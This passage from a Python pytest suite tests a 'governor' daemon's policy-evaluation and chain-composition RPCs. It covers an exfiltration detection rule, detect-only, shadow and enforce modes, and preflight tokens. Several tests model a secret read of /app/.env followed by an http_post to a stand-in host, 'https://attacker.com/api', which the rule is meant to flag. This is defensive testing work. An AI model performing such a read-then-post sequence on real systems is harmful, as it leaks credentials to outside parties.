        resp = await roundtrip(d, "policy.info")
        result = resp["result"]
        assert result["source"] == "file"
        assert result["load_status"] == "loaded"
        assert result["policy_bundle_id"] == "test.file"
        assert result["policy_bundle_version"] == "2.0.0"
        assert result["policy_content_hash"] is not None
        assert len(result["policy_content_hash"]) == 64  # sha256 hex

    @pytest.mark.asyncio
    async def test_policy_info_corrupt_file(self, dispatcher_and_state):
        """Corrupt policy.json → source='default', load_status='corrupt_file_fallback'."""
        d, state = dispatcher_and_state
        state._policy_rule_set = None
        state._policy_load_status = None
        (state.governor_dir / "policy.json").write_text("NOT VALID JSON {{{")
        resp = await roundtrip(d, "policy.info")
        result = resp["result"]
        assert result["source"] == "default"
        assert result["load_status"] == "corrupt_file_fallback"
        # Still hashes corrupt bytes for debugging
        assert result["policy_content_hash"] is not None

    @pytest.mark.asyncio
    async def test_policy_capabilities(self, dispatcher_and_state):
        """Returns vocabulary lists and version."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "policy.capabilities")
        result = resp["result"]
        assert result["capability_vocab_version"] == "cap-v1"
        assert result["obligation_vocab_version"] == "obl-v1"
        assert result["policy_engine_version"] == "1.0.0"
        assert isinstance(result["capabilities"], list)
        assert "read_fs" in result["capabilities"]
        assert isinstance(result["obligations"], list)
        assert "require_human_approval" in result["obligations"]

    @pytest.mark.asyncio
    async def test_policy_evaluate_requires_request(self, dispatcher_and_state):
        """Missing 'request' param → error."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "policy.evaluate", {})
        assert "error" in resp

    @pytest.mark.asyncio
    async def test_policy_evaluate_default_blocks(self, dispatcher_and_state):
        """Default deny-all policy → verdict=block."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(),
        })
        result = resp["result"]
        assert result["verdict"] == "block"

    @pytest.mark.asyncio
    async def test_policy_evaluate_with_pass_rule(self, dispatcher_and_state):
        """Matching pass rule → verdict=pass."""
        d, state = dispatcher_and_state
        state._policy_rule_set = None
        state._policy_load_status = None
        _write_policy(state.governor_dir, [
            _make_pass_rule("r-gate", subject_kinds=["gate_event"]),
        ])
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(kind="gate_event"),
        })
        result = resp["result"]
        assert result["verdict"] == "pass"

    @pytest.mark.asyncio
    async def test_policy_evaluate_emits_receipt_content(self, dispatcher_and_state):
        """Receipt has gate='policy_engine' with bounded payload fields."""
        d, state = dispatcher_and_state
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(),
        })
        assert resp["result"]["verdict"] == "block"

        receipts = state.receipt_system.query(gate="policy_engine")
        assert len(receipts) >= 1
        r = receipts[0]
        assert r.gate == "policy_engine"
        evidence = state.receipt_system.evidence_for(r)
        # Canonical fragment fields (same shape as gate fragments)
        assert "matched_rule_ids" in evidence
        assert isinstance(evidence["matched_rule_ids"], list)
        assert "obligation_kinds" in evidence
        assert isinstance(evidence["obligation_kinds"], list)
        assert "policy_identity" in evidence
        assert isinstance(evidence["policy_identity"], dict)
        assert "applied" in evidence
        assert "duration_ms" in evidence
        # RPC-specific context
        assert "request_id" in evidence
        assert "reason_codes" in evidence

    @pytest.mark.asyncio
    async def test_policy_evaluate_strict_taxonomy_blocks_unknown(
        self, dispatcher_and_state
    ):
        """Unknown capability + strict_taxonomy=True → block."""
        d, state = dispatcher_and_state
        state._policy_rule_set = None
        state._policy_load_status = None
        _write_policy(state.governor_dir, [_make_pass_rule()])
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(caps=["totally_unknown_cap"]),
            "strict_taxonomy": True,
        })
        result = resp["result"]
        assert result["verdict"] == "block"
        assert any("unknown_capability" in rc for rc in result["rationale"]["reason_codes"])

    @pytest.mark.asyncio
    async def test_policy_evaluate_returns_obligations(self, dispatcher_and_state):
        """Warn rule with obligations → obligations in result."""
        d, state = dispatcher_and_state
        state._policy_rule_set = None
        state._policy_load_status = None
        _write_policy(state.governor_dir, [
            _make_warn_rule("w-obl", obligations=[
                {"kind": "require_evidence", "params": {"type": "test_result"}},
            ], subject_kinds=["gate_event"]),
        ])
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(kind="gate_event"),
        })
        result = resp["result"]
        assert result["verdict"] == "warn"
        assert len(result["obligations"]) == 1
        assert result["obligations"][0]["kind"] == "require_evidence"

    @pytest.mark.asyncio
    async def test_policy_evaluate_result_schema(self, dispatcher_and_state):
        """All top-level fields present in result."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(),
        })
        result = resp["result"]
        for key in ("schema", "request_id", "evaluated_at", "verdict",
                     "matched_rules", "obligations", "rationale",
                     "policy_identity"):
            assert key in result, f"Missing key: {key}"

    @pytest.mark.asyncio
    async def test_policy_all_three_read_only(self, dispatcher_and_state):
        """All 3 policy methods are classified as read_only."""
        d, _ = dispatcher_and_state
        for m in ("policy.evaluate", "policy.info", "policy.capabilities"):
            assert not d.is_mutating(m), f"{m} should be read_only"

    @pytest.mark.asyncio
    async def test_policy_evaluate_identity_fields(self, dispatcher_and_state):
        """policy_identity populated in result."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(),
        })
        identity = resp["result"]["policy_identity"]
        assert identity["policy_engine_version"] == "1.0.0"
        assert identity["policy_bundle_id"] == "governor.default"

    @pytest.mark.asyncio
    async def test_policy_evaluate_malformed_strict_taxonomy(
        self, dispatcher_and_state
    ):
        """String 'true'/'false' coerced; garbage rejected."""
        d, _ = dispatcher_and_state
        # String "true" should work
        resp = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(),
            "strict_taxonomy": "true",
        })
        assert "result" in resp

        # String "false" should work
        resp2 = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(),
            "strict_taxonomy": "false",
        })
        assert "result" in resp2

        # Garbage string → error
        resp3 = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(),
            "strict_taxonomy": "maybe",
        })
        assert "error" in resp3

    @pytest.mark.asyncio
    async def test_policy_cached_no_auto_reload(self, dispatcher_and_state):
        """Write policy A → evaluate → overwrite with B → evaluate → still A."""
        d, state = dispatcher_and_state
        state._policy_rule_set = None
        state._policy_load_status = None
        _write_policy(state.governor_dir, [
            _make_pass_rule("rA", subject_kinds=["gate_event"]),
        ], bundle_id="bundle.A")

        # First eval triggers lazy load of bundle.A
        resp1 = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(kind="gate_event"),
        })
        assert resp1["result"]["policy_identity"]["policy_bundle_id"] == "bundle.A"

        # Overwrite with bundle.B — but do NOT reset cache
        _write_policy(state.governor_dir, [], bundle_id="bundle.B")

        # Second eval still uses cached bundle.A
        resp2 = await roundtrip(d, "policy.evaluate", {
            "request": _make_eval_request(kind="gate_event"),
        })
        assert resp2["result"]["policy_identity"]["policy_bundle_id"] == "bundle.A"

    @pytest.mark.asyncio
    async def test_existing_rpcs_unaffected_after_policy(self, dispatcher_and_state):
        """governor.hello + receipts.list still work after adding policy.*."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.hello")
        assert "protocol_version" in resp["result"]
        resp2 = await roundtrip(d, "receipts.list")
        assert isinstance(resp2["result"], list)


# =============================================================================
# Chain Composition Gate (Phase 2B: detect-only)
# =============================================================================


def _make_composition_rule(
    rule_id: str = "exfil-001",
    prior_sensitivity_gte: str | None = "secret_candidate",
    proposed_capability: str | None = "network_egress",
    proposed_trust_domain: str | None = "external",
    unless_condition: str | None = None,
    effect: str = "deny",
) -> dict:
    d: dict[str, Any] = {"rule_id": rule_id, "effect": effect}
    if prior_sensitivity_gte:
        d["prior_sensitivity_gte"] = prior_sensitivity_gte
    if proposed_capability:
        d["proposed_capability"] = proposed_capability
    if proposed_trust_domain:
        d["proposed_trust_domain"] = proposed_trust_domain
    if unless_condition:
        d["unless_condition"] = unless_condition
    return d


def _write_chain_rules(gov_dir: Path, rules: list[dict] | None = None) -> None:
    """Write a chain_rules.json file with the given rules."""
    if rules is None:
        rules = [_make_composition_rule()]
    data = {"rules": rules, "rule_set_version": "1.0.0"}
    (gov_dir / "chain_rules.json").write_text(json.dumps(data))


class TestChain:
    """Tests for chain.* RPC handlers."""

    @pytest.mark.asyncio
    async def test_chain_status_default(self, dispatcher_and_state):
        """No chain_rules.json → load_status='missing_policy'."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "chain.status")
        result = resp["result"]
        assert result["load_status"] == "missing_policy"
        assert result["rule_count"] == 0
        assert result["mode"] == "detect_only"

    @pytest.mark.asyncio
    async def test_chain_status_from_file(self, dispatcher_and_state):
        """Valid rules → load_status='loaded'."""
        d, state = dispatcher_and_state
        # Reset cached chain state so it reloads
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)
        resp = await roundtrip(d, "chain.status")
        result = resp["result"]
        assert result["load_status"] == "loaded"
        assert result["rule_count"] == 1

    @pytest.mark.asyncio
    async def test_chain_rules_returns_list(self, dispatcher_and_state):
        """Rule details present."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)
        resp = await roundtrip(d, "chain.rules")
        result = resp["result"]
        assert result["rule_count"] == 1
        assert len(result["rules"]) == 1
        rule = result["rules"][0]
        assert rule["rule_id"] == "exfil-001"
        assert rule["effect"] == "deny"

    @pytest.mark.asyncio
    async def test_chain_evaluate_requires_params(self, dispatcher_and_state):
        """Missing correlation_id → error."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "chain.evaluate", {"tool_id": "read_file"})
        assert "error" in resp

    @pytest.mark.asyncio
    async def test_chain_evaluate_single_step_allow(self, dispatcher_and_state):
        """Single step → verdict=allow (no composition to deny)."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)
        resp = await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/data.txt"},
            "correlation_id": "task-1",
        })
        result = resp["result"]
        assert result["kernel_verdict"] == "allow"
        assert result["mode"] == "detect_only"

    @pytest.mark.asyncio
    async def test_chain_evaluate_denied_composition(self, dispatcher_and_state):
        """secret+egress → verdict=deny, mode=detect_only."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Step 1: read a secret file
        resp1 = await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "correlation_id": "task-2",
        })
        assert resp1["result"]["kernel_verdict"] == "allow"

        # Step 2: egress to external → should trigger exfil rule
        resp2 = await roundtrip(d, "chain.evaluate", {
            "tool_id": "http_post",
            "args": {"url": "https://attacker.com/api"},
            "correlation_id": "task-2",
        })
        result = resp2["result"]
        assert result["kernel_verdict"] == "deny"
        assert result["mode"] == "detect_only"
        assert "exfil-001" in result["matched_rule_ids"]
        assert result["verdict_reason"] == "composition_denied"

    @pytest.mark.asyncio
    async def test_chain_evaluate_emits_receipt(self, dispatcher_and_state):
        """Receipt gate='chain_composition', fields present."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "correlation_id": "task-3",
        })

        receipts = state.receipt_system.query(gate="chain_composition")
        assert len(receipts) >= 1
        r = receipts[0]
        assert r.gate == "chain_composition"

    @pytest.mark.asyncio
    async def test_chain_evaluate_accumulates_log(self, dispatcher_and_state):
        """Second call sees first step in log (history_length grows)."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "correlation_id": "task-4",
        })
        resp2 = await roundtrip(d, "chain.evaluate", {
            "tool_id": "write_file",
            "args": {"path": "/tmp/b.txt"},
            "correlation_id": "task-4",
        })
        assert resp2["result"]["history_length"] == 2

    @pytest.mark.asyncio
    async def test_chain_evaluate_receipt_has_policy_fragment(self, dispatcher_and_state):
        """Canonical shape when policy loaded."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Write a minimal policy file
        from governor.policy_engine import PolicyRuleSet, PolicyRule
        policy = PolicyRuleSet(
            policy_bundle_id="test",
            policy_bundle_version="1.0.0",
            rules=(),
            default_verdict="pass",
        )
        (state.governor_dir / "policy.json").write_text(
            json.dumps(policy.to_dict())
        )
        state._policy_rule_set = None

        await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/x.txt"},
            "correlation_id": "task-5",
        })
        resp = await roundtrip(d, "chain.evaluate", {
            "tool_id": "http_post",
            "args": {"url": "https://ext.com/api"},
            "correlation_id": "task-5",
        })
        result = resp["result"]
        frag = result.get("policy_fragment")
        assert frag is not None
        assert "policy_verdict" in frag
        assert frag["applied"] is False
        assert frag["reason"] == "detect_only_mode"

    @pytest.mark.asyncio
    async def test_chain_evaluate_server_owns_annotation(self, dispatcher_and_state):
        """Caller can't override sensitivity — server annotates from tool_id+args."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Even if a caller tried to pass classification fields, they'd be ignored
        # (annotate_step only looks at tool_id and args)
        resp = await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "correlation_id": "task-6",
        })
        result = resp["result"]
        # The proposed step should have SECRET_CANDIDATE sensitivity
        # (from .env path pattern), not whatever a caller might have sent
        step = result["proposed_step"]
        assert step["data_sensitivity"] == "secret_candidate"

    @pytest.mark.asyncio
    async def test_chain_reset_clears_log(self, dispatcher_and_state):
        """Reset + subsequent evaluate starts fresh."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Create a log with one step
        await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "correlation_id": "task-7",
        })

        # Reset it
        resp = await roundtrip(d, "chain.reset", {
            "correlation_id": "task-7",
        })
        assert resp["result"]["reset"] is True
        assert resp["result"]["previous_history_length"] == 1

        # New evaluate should start fresh (history_length=1, not 2)
        resp2 = await roundtrip(d, "chain.evaluate", {
            "tool_id": "http_post",
            "args": {"url": "https://ext.com/api"},
            "correlation_id": "task-7",
        })
        assert resp2["result"]["history_length"] == 1

    @pytest.mark.asyncio
    async def test_chain_cached_no_auto_reload(self, dispatcher_and_state):
        """Rules cached for daemon lifetime — writing new file doesn't change them."""
        d, state = dispatcher_and_state
        # Trigger load with no file → missing_policy
        resp = await roundtrip(d, "chain.status")
        assert resp["result"]["load_status"] == "missing_policy"

        # Write rules file — cache should still hold missing_policy
        _write_chain_rules(state.governor_dir)
        resp2 = await roundtrip(d, "chain.status")
        assert resp2["result"]["load_status"] == "missing_policy"


# =============================================================================
# Phase 2C — Chain Enforcement (preflight/record, CAS binding, idempotency)
# =============================================================================


class TestChainEnforcement:
    """Tests for Phase 2C chain enforcement RPCs."""

    # ---- RPC basics ----

    @pytest.mark.asyncio
    async def test_chain_preflight_requires_params(self, dispatcher_and_state):
        """Missing correlation_id → error."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "chain.preflight", {"tool_id": "read_file"})
        assert "error" in resp

    @pytest.mark.asyncio
    async def test_chain_record_requires_params(self, dispatcher_and_state):
        """Missing result_status → error."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "correlation_id": "task-1",
        })
        assert "error" in resp

    @pytest.mark.asyncio
    async def test_chain_status_includes_mode(self, dispatcher_and_state):
        """mode field present in chain.status response."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "chain.status")
        result = resp["result"]
        assert "mode" in result
        assert result["mode"] == "detect_only"

    @pytest.mark.asyncio
    async def test_chain_status_missing_log_returns_log_exists_false(self, dispatcher_and_state):
        """Querying nonexistent log → log_exists=false."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "chain.status", {"correlation_id": "nope"})
        result = resp["result"]
        assert result["log_exists"] is False

    # ---- Mode behavior ----

    @pytest.mark.asyncio
    async def test_preflight_detect_only_denied_returns_decision_allow(self, dispatcher_and_state):
        """In detect_only mode, denied composition → decision='allow'."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Pre-seed a secret read in the log
        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "result_status": "ok",
            "correlation_id": "task-mode-1",
        })

        resp = await roundtrip(d, "chain.preflight", {
            "tool_id": "http_post",
            "args": {"url": "https://attacker.com/api"},
            "correlation_id": "task-mode-1",
        })
        result = resp["result"]
        assert result["decision"] == "allow"  # detect_only: signal but no block
        assert result["kernel_verdict"] == "deny"

    @pytest.mark.asyncio
    async def test_preflight_shadow_returns_would_block(self, dispatcher_and_state):
        """In shadow mode, denied → would_block."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        state._chain_mode = "enforce_shadow"
        _write_chain_rules(state.governor_dir)

        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "result_status": "ok",
            "correlation_id": "task-shadow-1",
        })
        resp = await roundtrip(d, "chain.preflight", {
            "tool_id": "http_post",
            "args": {"url": "https://attacker.com/api"},
            "correlation_id": "task-shadow-1",
        })
        result = resp["result"]
        assert result["decision"] == "would_block"
        assert result["mode"] == "enforce_shadow"

    @pytest.mark.asyncio
    async def test_preflight_enforce_returns_blocked(self, dispatcher_and_state):
        """In enforce mode, denied → blocked."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        state._chain_mode = "enforce"
        _write_chain_rules(state.governor_dir)

        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "result_status": "ok",
            "correlation_id": "task-enforce-1",
        })
        resp = await roundtrip(d, "chain.preflight", {
            "tool_id": "http_post",
            "args": {"url": "https://attacker.com/api"},
            "correlation_id": "task-enforce-1",
        })
        result = resp["result"]
        assert result["decision"] == "blocked"
        assert result["mode"] == "enforce"

    # ---- Preflight + record flow ----

    @pytest.mark.asyncio
    async def test_preflight_does_not_append_to_log(self, dispatcher_and_state):
        """Preflight must not add steps to the action log."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Record one step so the log exists
        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-nolog-1",
        })

        # Preflight should NOT add a step
        await roundtrip(d, "chain.preflight", {
            "tool_id": "write_file",
            "args": {"path": "/tmp/b.txt"},
            "correlation_id": "task-nolog-1",
        })

        # Verify log still has 1 step
        status = await roundtrip(d, "chain.status", {"correlation_id": "task-nolog-1"})
        assert status["result"]["history_length"] == 1

    @pytest.mark.asyncio
    async def test_record_appends_to_log(self, dispatcher_and_state):
        """Record adds steps to the action log."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        resp1 = await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-append-1",
        })
        assert resp1["result"]["recorded"] is True
        assert resp1["result"]["history_length"] == 1

        resp2 = await roundtrip(d, "chain.record", {
            "tool_id": "write_file",
            "args": {"path": "/tmp/b.txt"},
            "result_status": "ok",
            "correlation_id": "task-append-1",
        })
        assert resp2["result"]["history_length"] == 2

    @pytest.mark.asyncio
    async def test_preflight_then_record_full_flow(self, dispatcher_and_state):
        """Preflight → record → verify log grows."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Preflight
        pf = await roundtrip(d, "chain.preflight", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "correlation_id": "task-flow-1",
        })
        assert "preflight_token" in pf["result"]

        # Record with preflight token
        rec = await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-flow-1",
            "preflight_token": pf["result"]["preflight_token"],
        })
        assert rec["result"]["recorded"] is True
        assert rec["result"]["history_length"] == 1

    # ---- CAS binding ----

    @pytest.mark.asyncio
    async def test_record_with_valid_preflight_token_succeeds(self, dispatcher_and_state):
        """Valid token from preflight → record succeeds."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        pf = await roundtrip(d, "chain.preflight", {
            "tool_id": "bash",
            "args": {},
            "correlation_id": "task-cas-1",
        })
        token = pf["result"]["preflight_token"]

        rec = await roundtrip(d, "chain.record", {
            "tool_id": "bash",
            "args": {},
            "result_status": "ok",
            "correlation_id": "task-cas-1",
            "preflight_token": token,
        })
        assert rec["result"]["recorded"] is True

    @pytest.mark.asyncio
    async def test_record_with_stale_preflight_token_fails(self, dispatcher_and_state):
        """Token from old state → stale_preflight error."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Get a preflight token
        pf = await roundtrip(d, "chain.preflight", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "correlation_id": "task-cas-2",
        })
        token = pf["result"]["preflight_token"]

        # Mutate the log by recording a different step
        await roundtrip(d, "chain.record", {
            "tool_id": "write_file",
            "args": {"path": "/tmp/b.txt"},
            "result_status": "ok",
            "correlation_id": "task-cas-2",
        })

        # Now record with the old token → should fail
        rec = await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-cas-2",
            "preflight_token": token,
        })
        result = rec["result"]
        assert result.get("error") == "stale_preflight"

    @pytest.mark.asyncio
    async def test_record_without_preflight_token_allowed(self, dispatcher_and_state):
        """No token → graceful (legacy callers)."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        rec = await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-cas-3",
        })
        assert rec["result"]["recorded"] is True

    # ---- Record idempotency ----

    @pytest.mark.asyncio
    async def test_record_duplicate_record_id_returns_previous_result(self, dispatcher_and_state):
        """Same record_id → idempotent replay without double-append."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        rec1 = await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-idem-1",
            "record_id": "rec-001",
        })
        assert rec1["result"]["recorded"] is True
        assert rec1["result"]["history_length"] == 1

        rec2 = await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-idem-1",
            "record_id": "rec-001",
        })
        assert rec2["result"]["recorded"] is True
        assert rec2["result"]["idempotent_replay"] is True
        # Log should NOT have grown
        assert rec2["result"]["history_length"] == 1

    @pytest.mark.asyncio
    async def test_record_different_record_id_appends(self, dispatcher_and_state):
        """Different record_id → both steps appended."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-idem-2",
            "record_id": "rec-a",
        })
        rec2 = await roundtrip(d, "chain.record", {
            "tool_id": "write_file",
            "args": {"path": "/tmp/b.txt"},
            "result_status": "ok",
            "correlation_id": "task-idem-2",
            "record_id": "rec-b",
        })
        assert rec2["result"]["history_length"] == 2

    # ---- Shim restriction ----

    @pytest.mark.asyncio
    async def test_chain_evaluate_allowed_in_detect_only(self, dispatcher_and_state):
        """chain.evaluate works in detect_only mode (backward compat)."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        resp = await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "correlation_id": "task-shim-1",
        })
        result = resp["result"]
        assert result["kernel_verdict"] == "allow"
        assert result.get("deprecated") is True
        assert result.get("replacement") == ["chain.preflight", "chain.record"]

    @pytest.mark.asyncio
    async def test_chain_evaluate_rejected_in_enforce_returns_structured_error(self, dispatcher_and_state):
        """chain.evaluate returns structured error in enforce mode."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        state._chain_mode = "enforce"
        _write_chain_rules(state.governor_dir)

        resp = await roundtrip(d, "chain.evaluate", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "correlation_id": "task-shim-2",
        })
        result = resp["result"]
        assert result["error"] == "not_allowed_in_mode"
        assert result["mode"] == "enforce"

    # ---- Receipts ----

    @pytest.mark.asyncio
    async def test_preflight_receipt_includes_decision_and_block_reasons(self, dispatcher_and_state):
        """Preflight receipt emitted; result includes decision + block_reasons."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Seed a secret read
        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/app/.env"},
            "result_status": "ok",
            "correlation_id": "task-receipt-1",
        })

        initial_count = len(state.receipt_system.query(gate="chain_composition"))

        resp = await roundtrip(d, "chain.preflight", {
            "tool_id": "http_post",
            "args": {"url": "https://attacker.com/api"},
            "correlation_id": "task-receipt-1",
        })

        # Receipt emitted
        post_count = len(state.receipt_system.query(gate="chain_composition"))
        assert post_count > initial_count

        # RPC result has decision and block_reasons
        result = resp["result"]
        assert "decision" in result
        assert "block_reasons" in result
        assert len(result["block_reasons"]) >= 1

    @pytest.mark.asyncio
    async def test_record_receipt_emitted(self, dispatcher_and_state):
        """Record emits a receipt."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        initial_count = len(state.receipt_system.query(gate="chain_composition"))

        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-receipt-2",
        })

        post_count = len(state.receipt_system.query(gate="chain_composition"))
        assert post_count > initial_count

    # ---- Reset update ----

    @pytest.mark.asyncio
    async def test_reset_includes_log_existed_and_hash(self, dispatcher_and_state):
        """Reset response includes log_existed field."""
        d, state = dispatcher_and_state
        state._chain_rule_set = None
        _write_chain_rules(state.governor_dir)

        # Record a step
        await roundtrip(d, "chain.record", {
            "tool_id": "read_file",
            "args": {"path": "/tmp/a.txt"},
            "result_status": "ok",
            "correlation_id": "task-reset-1",
        })

        resp = await roundtrip(d, "chain.reset", {
            "correlation_id": "task-reset-1",
        })
        result = resp["result"]
        assert result["log_existed"] is True
        assert result["previous_history_length"] == 1

        # Reset nonexistent log
        resp2 = await roundtrip(d, "chain.reset", {
            "correlation_id": "task-reset-nonexistent",
        })
        assert resp2["result"]["log_existed"] is False
